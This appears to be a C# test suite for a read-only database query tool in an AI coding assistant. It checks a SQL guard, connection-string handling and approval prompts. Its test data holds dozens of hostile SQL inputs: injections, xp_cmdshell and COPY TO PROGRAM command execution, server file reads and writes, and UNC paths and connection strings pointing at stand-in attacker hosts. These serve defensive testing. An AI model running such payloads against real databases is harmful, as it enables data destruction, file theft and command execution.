using System.Data;
using System.Data.Common;
using System.IO;
using System.Text.Json;
using Inferpal.Localization;
using Inferpal.Services.Tools;
using Xunit;

namespace Inferpal.Tests;

/// <summary>
/// <c>query_database</c> (pari 115): the analysis against the gate's two corpora (the 40 attempts measured against
/// PostgreSQL, SQL Server and MariaDB, the 20 reads it must let through), where a connection is read, the engine its form
/// says, the card, and the order of the gestures — a server elsewhere is asked BEFORE it is reached.
/// </summary>
[Collection("QueryDatabaseSeam")]
public sealed class QueryDatabaseTests : IDisposable
{
    private readonly string _root = Directory.CreateTempSubdirectory("inferpal-db").FullName;

    public void Dispose()
    {
        try { Directory.Delete(_root, recursive: true); } catch { }
    }

    // ── The analysis: the gate's corpora ───────────────────────────────────────────────────────────

    [Theory]
        [InlineData("h01", "postgres", "DELETE FROM canary")]
        [InlineData("h02", "postgres", "UPDATE canary SET v = 0")]
        [InlineData("h03", "postgres", "WITH gone AS (DELETE FROM canary RETURNING *) SELECT * FROM gone")]
        [InlineData("h05", "postgres", "SELECT 1; DELETE FROM canary")]
        [InlineData("h06", "postgres", "SELECT 1 /* ; */ ; DELETE FROM canary -- */")]
        [InlineData("h07", "postgres", "SELECT $$;$$; DELETE FROM canary")]
        [InlineData("h08", "postgres", "SELECT 'a\\'; DELETE FROM canary; --'")]
        [InlineData("h09", "postgres", "COPY canary TO PROGRAM 'cmd /c echo pwn > \"C:\\probe\\out\\copy-program.txt\"'")]
        [InlineData("h10", "postgres", "COPY (SELECT 1) TO 'C:\\probe\\out\\copy-file.txt'")]
        [InlineData("h11", "postgres", "SELECT pg_read_file('C:\\probe\\secret.txt')")]
        [InlineData("h12", "postgres", "SELECT setval('canary_seq', 999)")]
        [InlineData("h13", "postgres", "ALTER SYSTEM SET work_mem = '1GB'")]
        [InlineData("h14", "postgres", "CREATE TABLE pwn (x int)")]
        [InlineData("h15", "postgres", "SELECT * FROM dblink('host=127.0.0.1 port=55432 user=postgres dbname=northwind', 'DELETE FROM canary RETURNING 1') AS t(x int)")]
        [InlineData("h16", "postgres", "SELECT lo_export(lo_from_bytea(0, 'pwn'::bytea), 'C:\\probe\\out\\lo.txt')")]
        [InlineData("h17", "postgres", "EXPLAIN ANALYZE DELETE FROM canary")]
        [InlineData("h18", "postgres", "CREATE ROLE pwn SUPERUSER")]
        [InlineData("h19", "postgres", "SELECT query_to_xml('DELETE FROM canary RETURNING 1', true, true, '')")]
        [InlineData("h20", "postgres", "DO $$ BEGIN DELETE FROM canary; END $$")]
        [InlineData("h21", "sqlserver", "DELETE FROM canary")]
        [InlineData("h22", "sqlserver", "SELECT * INTO pwn FROM canary")]
        [InlineData("h23", "sqlserver", "SELECT 1 DELETE FROM canary")]
        [InlineData("h24", "sqlserver", "EXEC xp_cmdshell 'echo pwn > \"C:\\probe\\out\\xp.txt\"'")]
        [InlineData("h25", "sqlserver", "SELECT 1; EXEC('DELETE FROM canary')")]
        [InlineData("h26", "sqlserver", "SELECT * FROM OPENROWSET(BULK 'C:\\probe\\secret.txt', SINGLE_CLOB) AS x")]
        [InlineData("h27", "sqlserver", "WITH x AS (SELECT 1 AS a) DELETE FROM canary")]
        [InlineData("h28", "sqlserver", "SELECT 1 /* ; */ DROP TABLE canary --")]
        [InlineData("h29", "sqlserver", "CREATE LOGIN pwn WITH PASSWORD = 'Pw0rd!x1-long'")]
        [InlineData("h30", "sqlserver", "SELECT [v] FROM canary; TRUNCATE TABLE canary")]
        [InlineData("h31", "mysql", "DELETE FROM canary")]
        [InlineData("h32", "mysql", "SELECT 1; DELETE FROM canary")]
        [InlineData("h33", "mysql", "SELECT 1 /*!50000 ; DELETE FROM canary */")]
        [InlineData("h35", "mysql", "SELECT * FROM canary INTO OUTFILE 'C:/probe/out/outfile.txt'")]
        [InlineData("h36", "mysql", "SELECT LOAD_FILE('C:/probe/secret.txt')")]
        [InlineData("h37", "mysql", "SELECT 1 --1; DELETE FROM canary")]
        [InlineData("h38", "mysql", "SELECT \"a\"; DELETE FROM canary")]
        [InlineData("h39", "mysql", "SELECT 1 # ; \n ; DELETE FROM canary")]
        [InlineData("h40", "mysql", "REPLACE INTO canary VALUES (1, 0)")]
        [InlineData("h41", "mysql", "SHOW TABLES; DELETE FROM canary")]
        [InlineData("h42", "mysql", "SHOW TABLES /*!50000 ; DELETE FROM canary */")]
        [InlineData("h43", "mysql", "DESCRIBE canary; DELETE FROM canary")]
        [InlineData("h44", "mysql", "DESC DELETE FROM canary")]
        [InlineData("h45", "sqlserver", "EXEC sp_helptext 'canary' DELETE FROM canary")]
        [InlineData("h46", "sqlserver", "EXEC sp_executesql N'DELETE FROM canary'")]
        [InlineData("h47", "sqlserver", "EXEC sp_help 'canary'; DROP TABLE canary")]
        [InlineData("h48", "sqlserver", "sp_configure 'show advanced options', 1")]
        [InlineData("h49", "sqlserver", "sp_help 'canary' sp_rename 'canary', 'pwn'")]
        [InlineData("h50", "sqlserver", "SELECT 1 COMMIT DENY SELECT ON canary TO public")]
        [InlineData("h51", "sqlserver", "SELECT 1 COMMIT BEGIN TRAN SELECT 2")]
        [InlineData("h52", "postgres", "SHOW work_mem; DELETE FROM canary")]
        [InlineData("h53", "postgres", "SELECT pg_stat_reset()")]
        [InlineData("h54", "postgres", "SELECT pg_notify('x', 'y')")]
        [InlineData("h55", "postgres", "SELECT \"pg_read_file\"('C:\\probe\\secret.txt')")]
        [InlineData("h56", "postgres", "SELECT 1 --\r, pg_read_file('C:\\probe\\secret.txt')")]
        [InlineData("h57", "postgres", "SELECT $é$'$é$ AS a, pg_read_file('C:\\probe\\secret.txt') AS b, $é$'$é$ AS c")]
        [InlineData("h58", "mysql", "SHOW DATABASES WHERE extractvalue(1, concat(0x7e, (SELECT LOAD_FILE('C:/probe/secret.txt'))))")]
        [InlineData("h59", "mysql", "SELECT 1e0INTO OUTFILE 'C:/probe/out/glued.txt'")]
        [InlineData("h60", "mysql", "SELECT 1-- INTO OUTFILE 'C:/probe/out/nbsp.txt'")]
        [InlineData("h61", "sqlserver", "SELECT 1e0DELETE canary")]
        [InlineData("h62", "sqlserver", "EXEC [app].sp_help")]
        [InlineData("h63", "postgres", "SELECT U&\"\\0070g_read_file\"('postgresql.conf')")]
        [InlineData("h64", "postgres", "SELECT u&\"!0064blink\" UESCAPE '!'('host=x', 'DELETE FROM canary')")]
        [InlineData("h65", "sqlserver", "SELECT * FROM sys.fn_trace_gettable('\\\\attacker\\s\\a.trc', default)")]
        [InlineData("h66", "sqlserver", "SELECT * FROM sys.fn_xe_file_target_read_file('\\\\attacker\\s\\*.xel', NULL, NULL, NULL)")]
        [InlineData("h67", "sqlserver", "SELECT * FROM [prodsrv].[sales].[dbo].[orders]")]
        [InlineData("h68", "sqlserver", "SELECT * FROM prodsrv.sales..orders")]
    public void AnAttemptToWriteOrActBeyondTheDatabase_IsRefusedByTheAnalysis(string id, string engine, string sql) =>
        Assert.True(SqlGuard.Refusal(sql, Engine(engine)) is not null, $"{id} passed the analysis: {sql}");

    private static DatabaseEngine Engine(string word) => DatabaseTargets.EngineOf(word)!.Value;

    /// <summary>A function of the person's that writes reads as a SELECT: the transaction stops it, which the gate measured.</summary>
    [Theory]
        [InlineData("h04", "postgres", "SELECT bump()")]
        [InlineData("h34", "mysql", "SELECT bump()")]
    public void AFunctionThatWrites_PassesTheAnalysis_ForTheTransactionToStop(string id, string engine, string sql) =>
        Assert.True(SqlGuard.Refusal(sql, Engine(engine)) is null, $"{id} is a plain SELECT of a function: {sql}");

    [Theory]
        [InlineData("l01", "postgres", "SELECT 'DELETE FROM canary' AS note")]
        [InlineData("l02", "postgres", "SELECT * FROM canary WHERE v > 5 -- drop this filter later")]
        [InlineData("l03", "postgres", "WITH t AS (SELECT * FROM orders) SELECT count(*) FROM t")]
        [InlineData("l04", "postgres", "SELECT replace(company_name, 'a', 'b') FROM customers LIMIT 3")]
        [InlineData("l05", "postgres", "SELECT order_id, sum(unit_price) OVER (PARTITION BY order_id) FROM order_details LIMIT 5")]
        [InlineData("l06", "postgres", "EXPLAIN SELECT * FROM orders")]
        [InlineData("l07", "postgres", "SELECT $$it's an update$$ AS s")]
        [InlineData("l08", "postgres", "SELECT \"order_id\" FROM \"orders\" LIMIT 1")]
        [InlineData("l09", "postgres", "SELECT count(*) AS update_count FROM customers /* insert stats here */")]
        [InlineData("l10", "postgres", "SELECT E'line\\nbreak' AS s")]
        [InlineData("l11", "sqlserver", "SELECT TOP 5 [CompanyName] FROM [Customers]")]
        [InlineData("l12", "sqlserver", "SELECT N'DROP TABLE x' AS t")]
        [InlineData("l13", "sqlserver", "WITH c AS (SELECT CustomerID FROM Orders) SELECT COUNT(*) FROM c")]
        [InlineData("l14", "sqlserver", "SELECT REPLACE(ContactName, ' ', '_') FROM Customers")]
        [InlineData("l15", "sqlserver", "SELECT 1 AS [update]")]
        [InlineData("l16", "mysql", "SELECT `v` FROM canary")]
        [InlineData("l17", "mysql", "SELECT 'it\\'s' AS s")]
        [InlineData("l18", "mysql", "SELECT v FROM canary # comment: drop it")]
        [InlineData("l19", "mysql", "SELECT CONCAT('a', '-- not a comment')")]
        [InlineData("l20", "mysql", "SELECT REPLACE('x', 'x', 'y') AS r")]
        [InlineData("l21", "mysql", "SHOW CREATE TABLE canary")]
        [InlineData("l22", "mysql", "SHOW INDEX FROM canary")]
        [InlineData("l23", "mysql", "DESCRIBE canary")]
        [InlineData("l24", "mysql", "SHOW GRANTS")]
        [InlineData("l25", "sqlserver", "EXEC sp_help 'canary'")]
        [InlineData("l26", "sqlserver", "EXEC sp_columns @table_name = N'canary'")]
        [InlineData("l27", "sqlserver", "sp_helpindex 'canary'")]
        [InlineData("l28", "sqlserver", "SELECT TOP 5 o.[OrderID] FROM [Northwind].[dbo].[Orders] o")]
        [InlineData("l29", "postgres", "SELECT \"U&x\" FROM \"orders\" LIMIT 1")]
        [InlineData("l28", "sqlserver", "SELECT 1 AS a SELECT 2 AS b")]
        [InlineData("l29", "postgres", "SHOW work_mem")]
        [InlineData("l30", "postgres", "SELECT pg_get_constraintdef(oid) FROM pg_constraint LIMIT 3")]
    public void ALegitimateRead_PassesTheAnalysis(string id, string engine, string sql) =>
        Assert.True(SqlGuard.Refusal(sql, Engine(engine)) is null, $"{id} refused: {SqlGuard.Refusal(sql, Engine(engine))}");

    [Fact]
    public void TextTheAnalysisCannotRead_IsRefused_NeverLetThrough()
    {
        Assert.NotNull(SqlGuard.Refusal("SELECT 'never closed", DatabaseEngine.Postgres));
        Assert.NotNull(SqlGuard.Refusal("SELECT 1 /* never closed", DatabaseEngine.SqlServer));
        Assert.NotNull(SqlGuard.Refusal("SELECT $tag$ never closed", DatabaseEngine.Postgres));
        Assert.NotNull(SqlGuard.Refusal("   ", DatabaseEngine.MySql));
    }

    // ── Where the project declares the connection ───────────────────────────────────────────────────

    [Fact]
    public async Task AJsonSettingsKey_IsRead_NestedOrFlat_InAnyCase()
    {
        File.WriteAllText(Path.Combine(_root, "appsettings.Development.json"),
            "{ // comments are allowed\n \"ConnectionStrings\": { \"Default\": \"Host=localhost;Database=shop;Username=app;Password=s3cret\" },\n \"Flat:Key\": \"Server=x\" }");
        var (nested, why) = await DatabaseSources.ResolveAsync("appsettings.Development.json#connectionstrings:default", _root, CancellationToken.None);
        Assert.True(nested is not null, why);
        Assert.Equal("Host=localhost;Database=shop;Username=app;Password=s3cret", nested!.ConnectionString);
        Assert.Equal("appsettings.Development.json › connectionstrings:default", nested.Shown);
        var (flat, _) = await DatabaseSources.ResolveAsync("appsettings.Development.json#Flat:Key", _root, CancellationToken.None);
        Assert.Equal("Server=x", flat!.ConnectionString);
    }

    [Fact]
    public async Task AMissingKey_NamesTheKeysBesideIt()
    {
        File.WriteAllText(Path.Combine(_root, "appsettings.json"), "{ \"ConnectionStrings\": { \"Shop\": \"x\", \"Audit\": \"y\" } }");
        var (source, why) = await DatabaseSources.ResolveAsync("appsettings.json#ConnectionStrings:Default", _root, CancellationToken.None);
        Assert.Null(source);
        Assert.Contains("ConnectionStrings:Shop", why);
        Assert.Contains("ConnectionStrings:Audit", why);
    }

    [Fact]
    public async Task ADotEnvKey_IsRead_ExportQuotesAndCommentsSetAside()
    {
        File.WriteAllText(Path.Combine(_root, ".env"), "# the app's settings\nexport DATABASE_URL=\"postgres://app:pw@localhost:5432/shop\"\nOTHER=1 # a comment\n");
        var (url, _) = await DatabaseSources.ResolveAsync(".env#DATABASE_URL", _root, CancellationToken.None);
        Assert.Equal("postgres://app:pw@localhost:5432/shop", url!.ConnectionString);
        var (other, _) = await DatabaseSources.ResolveAsync(".env#OTHER", _root, CancellationToken.None);
        Assert.Equal("1", other!.ConnectionString);
    }

    [Fact]
    public async Task AValueTheAppFillsAtStart_IsNoConnectionYet()
    {
        File.WriteAllText(Path.Combine(_root, ".env"), "DATABASE_URL=postgres://app:${DB_PASSWORD}@localhost/shop\n");
        var (source, why) = await DatabaseSources.ResolveAsync(".env#DATABASE_URL", _root, CancellationToken.None);
        Assert.Null(source);
        Assert.Contains("placeholder", why);
    }

    [Fact]
    public async Task AFileOutsideTheWorkspace_IsNotRead()
    {
        var outside = Directory.CreateTempSubdirectory("inferpal-db-outside").FullName;
        try
        {
            File.WriteAllText(Path.Combine(outside, "appsettings.json"), "{ \"ConnectionStrings\": { \"Default\": \"Server=x\" } }");
            var (source, why) = await DatabaseSources.ResolveAsync(Path.Combine(outside, "appsettings.json") + "#ConnectionStrings:Default", _root, CancellationToken.None);
            Assert.Null(source);
            Assert.Contains("outside the workspace", why);
        }
        finally { try { Directory.Delete(outside, recursive: true); } catch { } }
    }

    [Fact]
    public async Task AnEnvironmentVariable_IsRead()
    {
        var name = "INFERPAL_TEST_DB_" + Guid.NewGuid().ToString("N")[..8];
        Environment.SetEnvironmentVariable(name, "Server=(localdb)\\MSSQLLocalDB;Integrated Security=true");
        try
        {
            var (source, _) = await DatabaseSources.ResolveAsync("env:" + name, _root, CancellationToken.None);
            Assert.Equal("Server=(localdb)\\MSSQLLocalDB;Integrated Security=true", source!.ConnectionString);
            Assert.Equal("the environment variable " + name, source.Shown);
        }
        finally { Environment.SetEnvironmentVariable(name, null); }
    }

    [Fact]
    public async Task TheProjectsUserSecrets_AreRead_WhereDotnetKeepsThem()
    {
        var home = Directory.CreateTempSubdirectory("inferpal-db-secrets").FullName;
        var before = DatabaseSources.UserSecretsHome;
        try
        {
            DatabaseSources.UserSecretsHome = () => home;
            Directory.CreateDirectory(Path.Combine(_root, "Shop.Api"));
            File.WriteAllText(Path.Combine(_root, "Shop.Api", "Shop.Api.csproj"),
                "<Project Sdk=\"Microsoft.NET.Sdk.Web\"><PropertyGroup><UserSecretsId>abc-123</UserSecretsId></PropertyGroup></Project>");
            Directory.CreateDirectory(Path.Combine(home, "abc-123"));
            File.WriteAllText(Path.Combine(home, "abc-123", "secrets.json"), "{ \"ConnectionStrings:Shop\": \"Server=(localdb)\\\\MSSQLLocalDB;Database=Shop\" }");
            var (source, why) = await DatabaseSources.ResolveAsync("secrets:Shop.Api/Shop.Api.csproj#ConnectionStrings:Shop", _root, CancellationToken.None);
            Assert.True(source is not null, why);
            Assert.Equal("Server=(localdb)\\MSSQLLocalDB;Database=Shop", source!.ConnectionString);
            Assert.Equal("the user secrets of Shop.Api › ConnectionStrings:Shop", source.Shown);
        }
        finally
        {
            DatabaseSources.UserSecretsHome = before;
            try { Directory.Delete(home, recursive: true); } catch { }
        }
    }

    // ── The engine, from the string's form ───────────────────────────────────────────────────────────

    [Fact]
    public void AUrl_SaysItsEngine_AndNothingShownHoldsThePassword()
    {
        var (target, why) = DatabaseTargets.Of("postgres://app:s3cr%40t@localhost:5433/shop?sslmode=disable", engine: null);
        Assert.True(target is not null, why);
        Assert.Equal(DatabaseEngine.Postgres, target!.Engine);
        Assert.Equal("localhost:5433", target.Server);
        Assert.Equal("shop", target.Database);
        Assert.Equal("app", target.Account);
        Assert.True(target.OnThisMachine);
        Assert.Contains("s3cr@t", target.ConnectionString);                                       // for the driver only
        Assert.DoesNotContain("s3cr", target.Server + target.Database + target.Account + target.Label);
        Assert.Equal(DatabaseEngine.MySql, DatabaseTargets.Of("mysql://root@db.example.com/shop", null).Target!.Engine);
    }

    [Fact]
    public void KeyValueStrings_SayTheirEngine_ByTheirOwnKeys()
    {
        var localDb = DatabaseTargets.Of(@"Server=(localdb)\MSSQLLocalDB;Database=Shop;Trusted_Connection=True", null).Target!;
        Assert.Equal(DatabaseEngine.SqlServer, localDb.Engine);
        Assert.True(localDb.OnThisMachine);
        Assert.True(localDb.WindowsAccount);
        Assert.Equal(DatabaseEngine.MySql, DatabaseTargets.Of("Server=127.0.0.1;Port=3306;Uid=root;Pwd=x;Database=shop", null).Target!.Engine);
        Assert.Equal(DatabaseEngine.Postgres, DatabaseTargets.Of("Host=localhost;Username=app;Password=x;Database=shop", null).Target!.Engine);
    }

    [Fact]
    public void AStringWhoseKeysEveryEngineTakes_AsksForTheEngine_UnlessItIsGiven()
    {
        var (none, why) = DatabaseTargets.Of("Server=db.example.com;Database=shop;User ID=app;Password=x", null);
        Assert.Null(none);
        Assert.Contains("engine", why);
        var given = DatabaseTargets.Of("Server=db.example.com;Database=shop;User ID=app;Password=x", DatabaseEngine.MySql).Target!;
        Assert.Equal(DatabaseEngine.MySql, given.Engine);
        Assert.False(given.OnThisMachine);
    }

    [Theory]
    [InlineData("localhost", true)]
    [InlineData("127.0.0.1", true)]
    [InlineData("[::1]", true)]
    [InlineData(".", true)]
    [InlineData("(local)", true)]
    [InlineData("db.localhost", false)]
    [InlineData("db.example.com", false)]
    [InlineData("127.example.com", false)]
    [InlineData("10.0.0.5", false)]
    public void OnlyAHostWrittenAsThisMachine_IsThisMachine(string host, bool local) =>
        Assert.Equal(local, DatabaseTargets.IsLocal(host));

    // ── The card ─────────────────────────────────────────────────────────────────────────────────────

    private static DatabaseSource Source(string shown = "appsettings.Development.json › ConnectionStrings:Default") =>
        new("appsettings.Development.json#ConnectionStrings:Default", shown, "unused");

    [Fact]
    public void TheCardOnThisMachine_StatesWhereEngineServerAndAccount_AndOffersAlwaysForThatDatabase()
    {
        var target = DatabaseTargets.Of("Host=localhost;Username=app_reader;Password=x;Database=northwind", null).Target!;
        var details = QueryDatabaseTool.Details(target, Source(), AccountRights.ReadOnly, "query", null, "SELECT count(*)\nFROM orders");
        var card = ApprovalCard.Build(new ApprovalPrompt("query_database", details, "subject", null, "message"), root: null);

        Assert.Equal(Strings.ApprovalReadDatabase("northwind"), card.Title);
        Assert.Equal(Strings.ApprovalDatabaseQuery, card.Subject);
        Assert.Equal([Strings.DatabaseRowFoundIn, Strings.DatabaseRowEngine, Strings.DatabaseRowServer, Strings.DatabaseRowAccount],
                     card.Rows!.Select(r => r.Label));
        Assert.Equal("appsettings.Development.json › ConnectionStrings:Default", card.Rows![0].Value);
        Assert.Equal(Strings.DatabaseServerHere("localhost:5432"), card.Rows[2].Value);
        Assert.Equal(Strings.DatabaseAccountReadOnly("app_reader"), card.Rows[3].Value);
        Assert.Equal(["SELECT count(*)", "FROM orders"], card.Preview.Select(p => p.Text));
        Assert.True(card.OffersAlways);
        Assert.Equal(Strings.ApprovalAlwaysFor("northwind"), card.AlwaysLabel);
        Assert.Equal(string.Empty, card.Warning);
        Assert.False(card.Outbound);
    }

    [Fact]
    public void TheCardElsewhere_WarnsTwice_OffersNoAlways_AndDefaultsToDeny()
    {
        var target = DatabaseTargets.Of("Server=db-staging.corp.lan,1433;Database=Orders;User ID=app;Password=x", null).Target!;
        var details = QueryDatabaseTool.Details(target, Source(".env.staging › DATABASE_URL"), AccountRights.CanWrite, "tables", null, null);
        var card = ApprovalCard.Build(new ApprovalPrompt("query_database", details, "subject", null, "message"), root: null);

        Assert.Equal(Strings.ApprovalDatabaseTables, card.Subject);
        Assert.Contains(Strings.DatabaseCanWrite, card.Warning);
        Assert.Contains(Strings.DatabaseElsewhere, card.Warning);
        Assert.Equal("db-staging.corp.lan,1433", card.Rows![2].Value);                                // never "on this machine"
        Assert.False(card.OffersAlways);
        Assert.True(card.Outbound);
        Assert.Empty(card.Preview);
    }

    [Fact]
    public void ATableNameWithALineBreak_NeverAddsAFactToTheCard()
    {
        var target = DatabaseTargets.Of("Host=db.example.com;Username=app;Password=x;Database=shop", null).Target!;
        var details = QueryDatabaseTool.Details(target, Source(), AccountRights.CanWrite, "describe", "orders\nwhere: this machine\nrights: read-only", null);
        var card = ApprovalCard.Build(new ApprovalPrompt("query_database", details, "subject", null, "message"), root: null);

        Assert.Contains(Strings.DatabaseElsewhere, card.Warning);
        Assert.Contains(Strings.DatabaseCanWrite, card.Warning);
        Assert.Equal("db.example.com:5432", card.Rows![2].Value);
        Assert.True(card.Outbound);
    }

    [Fact]
    public void AServersSecondPlace_IsJudgedToo_AFailoverPartnerOrAPipeToAnotherHost()
    {
        Assert.False(DatabaseTargets.Of("Server=localhost;Failover Partner=evil.example.com;Database=x;Integrated Security=true", null).Target!.OnThisMachine);
        Assert.True(DatabaseTargets.Of("Server=localhost;Failover Partner=(local);Database=x;Integrated Security=true", null).Target!.OnThisMachine);
        Assert.False(DatabaseTargets.Of("Server=attacker.example.com;Protocol=pipe;Database=x;User ID=a", DatabaseEngine.MySql).Target!.OnThisMachine);
        Assert.True(DatabaseTargets.Of("Server=localhost;Protocol=pipe;Database=x;User ID=a", DatabaseEngine.MySql).Target!.OnThisMachine);
    }

    [Theory]
    [InlineData(@"..\..\OtherApp")]
    [InlineData(@"C:\elsewhere")]
    [InlineData("../other")]
    public async Task AUserSecretsIdThatIsAPath_IsNotFollowed(string id)
    {
        var home = Directory.CreateTempSubdirectory("inferpal-db-secrets").FullName;
        var before = DatabaseSources.UserSecretsHome;
        try
        {
            DatabaseSources.UserSecretsHome = () => home;
            File.WriteAllText(Path.Combine(_root, "App.csproj"), $"<Project><PropertyGroup><UserSecretsId>{id}</UserSecretsId></PropertyGroup></Project>");
            var (source, why) = await DatabaseSources.ResolveAsync("secrets:App.csproj#ConnectionStrings:X", _root, CancellationToken.None);
            Assert.Null(source);
            Assert.Contains("no plain name", why);
        }
        finally
        {
            DatabaseSources.UserSecretsHome = before;
            try { Directory.Delete(home, recursive: true); } catch { }
        }
    }

    [Fact]
    public void AFileOnAnotherMachine_InAnyKey_IsRefused_BeforeAnyConnection()
    {
        var (target, why) = DatabaseTargets.Of(@"Host=localhost;Username=app;Passfile=\\evil.example.com\share\pgpass", null);
        Assert.Null(target);
        Assert.Contains("passfile", why, StringComparison.OrdinalIgnoreCase);
        Assert.Null(DatabaseTargets.Of(@"Server=(localdb)\MSSQLLocalDB;AttachDBFilename=//evil.example.com/x.mdf;Integrated Security=true", null).Target);
    }

    [Fact]
    public void MySqlNeverLoadsALocalFile_TheServerCouldAskForAny() =>
        Assert.Contains("allowloadlocalinfile=false",
            DatabaseTargets.Of("Server=localhost;Uid=root;AllowLoadLocalInfile=true;Database=x", null).Target!.ConnectionString.Replace(" ", "").ToLowerInvariant());

    [Theory]
    [InlineData("sk-live-abc=1", "postgres")]
    [InlineData("Host=localhost;Port=sk-live-123", "postgres")]
    [InlineData("Server=localhost;Port=sk-live-123", "mysql")]
    [InlineData("sk-live-abc=1", "mysql")]
    [InlineData("Server=x;Connect Timeout=sk-live-1", "sqlserver")]
    [InlineData("sk-live-abc=1", "sqlserver")]
    public void AValueThatIsNoConnectionString_IsNeverQuotedBack(string value, string engine)
    {
        var (target, why) = DatabaseTargets.Of(value, Engine(engine));
        Assert.Null(target);
        Assert.DoesNotContain("sk-live", why, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("does not read as a connection string", why);                                // WITNESS: refused, and said
    }

    [Fact]
    public void ShowWithAWhere_IsRefused_ItTakesAnyExpression() =>
        Assert.Contains("WHERE", SqlGuard.Refusal("SHOW TABLES WHERE 1 = 1", DatabaseEngine.MySql));

    [Fact]
    public void AQuotedDotEnvValue_EndsAtItsQuote_ACommentAfterIt() =>
        Assert.Equal("postgres://a@b/c", DatabaseSources.EnvKey("DATABASE_URL=\"postgres://a@b/c\" # the dev database\n", "DATABASE_URL"));

    // ── The order of the gestures ────────────────────────────────────────────────────────────────────

    private sealed class RecordingApproval(bool answer, List<string> events) : IApprovalService
    {
        public string? LastDetails;
        public Task<bool> RequestApprovalAsync(string toolName, string details, CancellationToken ct, string? subject = null,
                                               Services.CodeActions.DiffInfo? diff = null, bool forcePrompt = false)
        {
            events.Add(forcePrompt ? "card (forced)" : "card");
            LastDetails = details;
            return Task.FromResult(answer);
        }

        public Task<bool> RequestScopedApprovalAsync(string toolName, string details, string subject, string grantKey, CancellationToken ct, bool forcePrompt = false)
        {
            events.Add("card (scoped)");
            LastDetails = details;
            return Task.FromResult(answer);
        }
    }

    /// <summary>A connection whose every command fails as a database does: enough to follow the gestures.</summary>
    private sealed class FailingConnection(List<string> events) : DbConnection
    {
        public bool Disposed;
        [System.Diagnostics.CodeAnalysis.AllowNull] public override string ConnectionString { get; set; } = string.Empty;
        public override string Database => "fake";
        public override string DataSource => "fake";
        public override string ServerVersion => "0";
        public override ConnectionState State => ConnectionState.Open;
        public override void ChangeDatabase(string databaseName) { }
        public override void Close() { }
        public override void Open() { }
        protected override DbTransaction BeginDbTransaction(IsolationLevel isolationLevel) => throw new FakeDbException();
        protected override DbCommand CreateDbCommand() { events.Add("command"); return new FailingCommand(); }
        protected override void Dispose(bool disposing) { if (!Disposed) events.Add("close"); Disposed = true; base.Dispose(disposing); }
    }

    private sealed class FakeDbException() : DbException("the fake database refuses");

    private sealed class FailingCommand : DbCommand
    {
        [System.Diagnostics.CodeAnalysis.AllowNull] public override string CommandText { get; set; } = string.Empty;
        public override int CommandTimeout { get; set; }
        public override CommandType CommandType { get; set; }
        public override bool DesignTimeVisible { get; set; }
        public override UpdateRowSource UpdatedRowSource { get; set; }
        protected override DbConnection? DbConnection { get; set; }
        protected override DbParameterCollection DbParameterCollection => throw new NotSupportedException();
        protected override DbTransaction? DbTransaction { get; set; }
        public override void Cancel() { }
        public override int ExecuteNonQuery() => throw new FakeDbException();
        public override object ExecuteScalar() => throw new FakeDbException();
        public override void Prepare() { }
        protected override DbParameter CreateDbParameter() => throw new NotSupportedException();
        protected override DbDataReader ExecuteDbDataReader(CommandBehavior behavior) => throw new FakeDbException();
    }

    private async Task<(string Result, List<string> Events, FailingConnection? Connection)> RunAsync(string connection, string sql, bool answer)
    {
        File.WriteAllText(Path.Combine(_root, "appsettings.json"), JsonSerializer.Serialize(new { ConnectionStrings = new { Default = connection } }));
        var events = new List<string>();
        FailingConnection? opened = null;
        var before = DatabaseReader.Open;
        try
        {
            DatabaseReader.Open = (_, _) => { events.Add("connect"); opened = new FailingConnection(events); return Task.FromResult<DbConnection>(opened); };
            var tool = new QueryDatabaseTool(new RecordingApproval(answer, events), () => _root);
            var args = JsonSerializer.SerializeToElement(new { connection = "appsettings.json#ConnectionStrings:Default", sql });
            return (await tool.ExecuteAsync(args, CancellationToken.None), events, opened);
        }
        finally { DatabaseReader.Open = before; }
    }

    [Fact]
    public async Task AServerElsewhere_IsAskedBeforeItIsReached_EveryTime()
    {
        var (_, events, _) = await RunAsync("Host=db.example.com;Username=app;Password=x;Database=shop", "SELECT 1", answer: true);
        Assert.Equal("card (forced)", events[0]);                                                      // before any connection
        Assert.Contains("connect", events);
    }

    [Fact]
    public async Task AServerElsewhere_Refused_IsNeverReached()
    {
        var (result, events, _) = await RunAsync("Host=db.example.com;Username=app;Password=x;Database=shop", "SELECT 1", answer: false);
        Assert.Equal(Services.Execution.ToolFailure.CancelledByUser, result);
        Assert.DoesNotContain("connect", events);
    }

    [Fact]
    public async Task AServerOnThisMachine_IsReadFirst_ForTheCardToSayTheAccountsRights()
    {
        var (_, events, connection) = await RunAsync("Host=localhost;Username=app;Password=x;Database=shop", "SELECT 1", answer: false);
        // Closed BEFORE the card: a card may wait for hours, and no connection is held meanwhile.
        Assert.Equal(["connect", "command", "close", "card (scoped)"], events.Take(4));
        Assert.True(connection!.Disposed);
    }

    [Fact]
    public async Task AQueryTheAnalysisRefuses_AsksNothing_AndReachesNothing()
    {
        var (result, events, _) = await RunAsync("Host=localhost;Username=app;Password=x;Database=shop", "DELETE FROM orders", answer: true);
        Assert.StartsWith("Error: Inferpal only reads a database", result);
        Assert.Empty(events);
    }

    [Fact]
    public async Task TheConnectionString_NeverReachesTheModel()
    {
        var (result, _, _) = await RunAsync("Host=localhost;Username=app;Password=hunter2;Database=shop", "SELECT 1", answer: true);
        Assert.DoesNotContain("hunter2", result);
        Assert.Contains("appsettings.json › ConnectionStrings:Default", result);                      // WITNESS: the place, said
    }
}
